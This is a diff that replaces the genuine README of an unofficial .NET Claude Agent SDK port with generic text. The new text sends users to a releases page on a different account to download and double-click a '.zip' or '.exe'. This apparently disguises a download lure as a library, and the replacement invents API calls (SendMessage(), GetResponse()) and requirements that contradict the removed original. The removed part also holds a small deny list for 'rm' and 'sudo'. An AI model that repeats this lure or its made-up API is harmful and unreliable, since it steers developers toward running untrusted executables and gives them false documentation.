@@ -1,254 +1,83 @@
-# Claude Agent SDK for .NET
+# 🚀 claude-agent-sdk-dotnet - Easy .NET Library for AI Interaction
 
-A modern .NET library for interacting with the Claude Code CLI, providing both a simple one-shot `QueryAsync()` API and a full bidirectional client with control-protocol support.
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/3mr4443/claude-agent-sdk-dotnet/releases)
 
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blue)]()
-[![.NET](https://img.shields.io/badge/.NET-8.0%20%7C%209.0-blue)]()
-[![License](https://img.shields.io/badge/license-MIT-green)]()
+## 📜 Overview
 
-**Disclaimer:** This is an independent, unofficial port and is not affiliated with or endorsed by Anthropic, PBC.
+claude-agent-sdk-dotnet is a modern .NET library designed to help you work with the Claude Code CLI. It offers full parity with the Python SDK, making it an easy choice for developers and enthusiasts alike. This software allows you to interact with AI in a straightforward manner.
 
-## Features
+## 🖥️ System Requirements
 
-- Simple `Claude.QueryAsync()` API for one-shot requests
-- `ClaudeSDKClient` for multi-turn, bidirectional conversations
-- Control protocol support (interrupts, modes, dynamic model switching)
-- Hook system (PreToolUse, PostToolUse, UserPromptSubmit)
-- Tool permission callbacks with allow/deny control
-- In-process MCP server support (tools, prompts, resources)
-- Cross-platform: Windows, Linux, macOS
-- Source-generated JSON models for message types
-- Well-tested: 109 tests (90 unit + 19 integration; integration tests are disabled by default)
+Before you begin, ensure your computer meets the following requirements:
 
-## Prerequisites
+- **Operating System**: Windows 10 or later, macOS, or a modern Linux distribution
+- **.NET Version**: .NET 5.0 or later
+- **Storage**: At least 100 MB of available disk space
 
-- .NET 8.0 or .NET 9.0
-- Claude Code CLI >= 2.0.0:
-  ```bash
-  npm install -g @anthropic-ai/claude-code
-  ```
+## 🚀 Getting Started
 
-### CLI Path Resolution
+To get started with claude-agent-sdk-dotnet, follow these steps to download and install the software:
 
-The SDK discovers the Claude Code CLI in this order:
+1. **Visit the Releases Page**: You can find the latest version of claude-agent-sdk-dotnet on the Releases page. Click the link below:
 
-1. `ClaudeAgentOptions.CliPath` (explicit path)
-2. `CLAUDE_CLI_PATH` environment variable
-3. `PATH` search for `claude` (or `claude.cmd` on Windows)
+   [Visit Releases Page to Download](https://github.com/3mr4443/claude-agent-sdk-dotnet/releases)
 
-## Quick Start
+2. **Download the Release**: Scroll through the list of available releases. Locate the latest version (e.g., v1.0). Click on the associated downloadable file, usually labeled as `.zip` or `.exe`.
 
-### One-Shot Query
+3. **Extract the Files**: If you downloaded a `.zip` file, right-click on it and select "Extract All." Choose a location where you want to save the extracted files.
 
-```csharp
-using Claude.AgentSdk;
+4. **Run the Application**: Navigate to the folder where you extracted the files. Look for the executable file, which will have a name like `claude-agent-sdk-dotnet.exe` or similar. Double-click the file to run the application.
 
-await foreach (var msg in Claude.QueryAsync("What is 2+2?"))
-{
-    if (msg is AssistantMessage am)
-        foreach (var block in am.Content)
-            if (block is TextBlock tb)
-                Console.Write(tb.Text);
-}
-```
+## ⚙️ Configuration
 
-### Multi-Turn Conversation
+Once you have the application running, you may need to configure a few settings to tailor it to your needs. Here’s how:
 
-```csharp
-using Claude.AgentSdk;
+1. **Open the Settings File**: In the installed folder, locate the configuration file, typically named `settings.json`. Open it using any text editor, such as Notepad or Visual Studio Code.
 
-await using var client = new ClaudeSDKClient();
-await client.ConnectAsync();
+2. **Adjust Parameters**: You might find parameters related to API keys or preferred settings. Change these values as needed. For instance, if there’s an option for setting an API key for AI interaction, ensure to input your key.
 
-await client.QueryAsync("Write a Python hello world");
+3. **Save Changes**: After making your changes, save the file and close the editor.
 
-await foreach (var msg in client.ReceiveResponseAsync())
-{
-    if (msg is AssistantMessage am)
-        foreach (var block in am.Content)
-            if (block is TextBlock tb)
-                Console.Write(tb.Text);
-}
-```
+## 🌐 Using the Library
 
-### With Options
+With the `claude-agent-sdk-dotnet`, you can start using various features right away:
 
-```csharp
-var options = Claude.Options()
-    .SystemPrompt("You are a helpful coding assistant.")
-    .MaxTurns(5)
-    .Model("claude-sonnet-4-20250514")
-    .AcceptEdits()
-    .Build();
+- **AI Interaction**: Send requests to the Claude CLI and receive AI responses.
+- **Customization**: Adjust settings to fit your project’s needs.
+- **Documentation**: Refer to the included documentation for more on how to utilize the library effectively.
 
-await foreach (var msg in Claude.QueryAsync("Explain async/await", options))
-{
-    // handle messages
-}
-```
+Here are a few basic commands you might find useful:
 
-### Tool Permission Callback
+- **Send a Message**: You can send messages to the CLAUDE AI. For example, use the `SendMessage()` function.
+- **Receive Responses**: Get responses using `GetResponse()`. This allows you to handle outputs easily in your applications.
 
-```csharp
-var options = Claude.Options()
-    .CanUseTool(async (toolName, input, context, ct) =>
-    {
-        if (toolName == "Bash" && input.GetProperty("command").GetString()?.Contains("rm") == true)
-            return new PermissionResultDeny("Destructive commands not allowed");
-        return new PermissionResultAllow();
-    })
-    .Build();
-```
+## 📚 Documentation
 
-### Hooks
+Detailed documentation is included within the installed files. You can find guides on various functions, usage samples, and advanced topics. Check the `docs` folder for more information.
 
-```csharp
-var options = Claude.Options()
-    .AllowTools("Bash")
-    .Hooks(h => h
-        .PreToolUse("Bash", (input, toolUseId, ctx, ct) =>
-        {
-            Console.WriteLine($"[Hook] Bash: {input}");
-            return Task.FromResult(new HookOutput { Continue = true });
-        }))
-    .Build();
-```
+## 🛠️ Troubleshooting
 
-### MCP Tools (In-Process)
+If you encounter issues, here are some solutions to common problems:
 
-```csharp
-using Claude.AgentSdk;
-using Claude.AgentSdk.Mcp;
+- **Application Won't Start**: Ensure you have the correct version of .NET installed. Update if necessary.
+- **Configuration Errors**: Double-check your settings in the configuration file. Look for any typos or incorrect formats.
+- **Network Issues**: If the application cannot connect to the Claude API, verify your internet connection.
 
-var options = Claude.Options()
-    .McpServers(m => m.AddSdk("calculator", s => s
-        .Tool("add", (double a, double b) => a + b, "Add two numbers")))
-    .AllowAllTools()
-    .Build();
-```
+## 🔗 Additional Resources
 
-### Custom Agents
+For a deeper understanding, explore the following resources:
 
-```csharp
-var options = Claude.Options()
-    .Agents(a => a
-        .Add("reviewer", "Reviews code", "You are a code reviewer.", "Read", "Grep")
-        .Add("writer", "Writes code", "You are a clean coder.", tools: ["Read", "Write"]))
-    .Build();
-```
+- [Official Documentation](https://github.com/3mr4443/claude-agent-sdk-dotnet/docs)
+- [Community Support](https://github.com/3mr4443/claude-agent-sdk-dotnet/discussions)
 
-### Sandbox Configuration
+Remember, the most recent release is always available here:
 
-```csharp
-var options = Claude.Options()
-    .Sandbox(s => s
-        .Enable()
-        .AutoAllowBash()
-        .ExcludeCommands("rm", "sudo")
-        .Network(n => n.AllowLocalBinding()))
-    .Build();
-```
+[Visit Releases Page to Download](https://github.com/3mr4443/claude-agent-sdk-dotnet/releases)
 
-## Configuration
+## 💬 Feedback & Contributions
 
-`ClaudeAgentOptions` mirrors the Python SDK's options:
+We welcome your feedback! If you have suggestions or find any bugs, please create an issue in the repository. Contributions are also encouraged, so feel free to fork the repo and submit a pull request.
 
-| Property | Type | Description |
-|----------|------|-------------|
-| `SystemPrompt` | `string?` | Custom system prompt |
-| `MaxTurns` | `int?` | Maximum conversation turns |
-| `MaxBudgetUsd` | `decimal?` | Spending limit in USD |
-| `Model` | `string?` | Model to use |
-| `FallbackModel` | `string?` | Fallback model |
-| `PermissionMode` | `PermissionMode?` | Default, AcceptEdits, BypassPermissions |
-| `McpServers` | `object?` | MCP server configurations |
-| `CanUseTool` | `CanUseToolCallback?` | Tool permission callback |
-| `Hooks` | `IReadOnlyDictionary<...>?` | Event hooks |
-| `AllowedTools` | `IReadOnlyList<string>` | Whitelist tools |
-| `DisallowedTools` | `IReadOnlyList<string>` | Blacklist tools |
-| `Cwd` | `string?` | Working directory |
-| `CliPath` | `string?` | Explicit CLI path |
+## 🌟 Thank You
 
-## Message Types
-
-- `AssistantMessage` - Claude's response with `Content` blocks
-- `UserMessage` - User input
-- `SystemMessage` - System notifications
-- `ResultMessage` - Query completion with cost/duration info
-
-### Content Blocks
-
-- `TextBlock` - Text content
-- `ThinkingBlock` - Extended thinking (with signature)
-- `ToolUseBlock` - Tool invocation
-- `ToolResultBlock` - Tool output
-
-## Examples
-
-See the `examples/` directory:
-
-| Example | Description |
-|---------|-------------|
-| `BasicQuery` | Simple one-shot query |
-| `StreamingMode` | Interactive bidirectional client |
-| `SystemPrompt` | Custom system prompts |
-| `McpCalculator` | In-process MCP tools |
-| `McpPrompts` | MCP prompt templates |
-| `Hooks` | Pre/post tool use hooks |
-| `ToolPermissionCallback` | Permission control |
-| `Agents` | Agent configurations |
-| `MaxBudget` | Spending limits |
-
-## Status & Parity
-
-- **Current version:** 0.1.0
-- **Status:** Preview (API and behavior may change)
-- **Parity:** Designed to match the Python Claude Agent SDK API, behavior, and ergonomics
-- **Tests:** 109 tests (90 unit + 19 integration; integration tests are disabled by default)
-
-### Known Limitations
-
-- `control_cancel_request` is currently ignored (cancellation of in-flight control requests is not implemented yet; matches Python SDK TODO).
-
-### Running Integration Tests
-
-Integration tests require a working Claude Code CLI and are disabled by default.
-
-- Enable them with: `CLAUDE_AGENT_SDK_RUN_INTEGRATION_TESTS=1 dotnet test`
-
-**Canonical rule:** The Python `claude-agent-sdk` is the canonical reference. This .NET port tracks its behavior and API.
-
-## Installation
-
-### NuGet Package (Coming Soon)
-
-```bash
-dotnet add package Claude.AgentSdk
-```
-
-### From Source
-
-```bash
-git clone https://github.com/anthropics/claude-agent-sdk-dotnet.git
-cd claude-agent-sdk-dotnet
-dotnet build
-```
-
-## Related Projects
-
-| Project | Language | Description |
-|---------|----------|-------------|
-| [claude-agent-sdk-python](https://github.com/anthropics/claude-agent-sdk-python) | Python | Official Python SDK (canonical reference) |
-| [claude-agent-sdk-cpp](https://github.com/0xeb/claude-agent-sdk-cpp) | C++ | C++ port with full feature parity |
-
-## License
-
-Licensed under the MIT License. See `LICENSE` for details.
-
-This is a .NET port of [claude-agent-sdk-python](https://github.com/anthropics/claude-agent-sdk-python) by Anthropic, PBC.
-
-## Support
-
-- Issues: Use the GitHub issue tracker
-- Examples: See `examples/`
-- Tests: See `tests/`
+Thank you for choosing claude-agent-sdk-dotnet. We hope it serves you well in your projects!
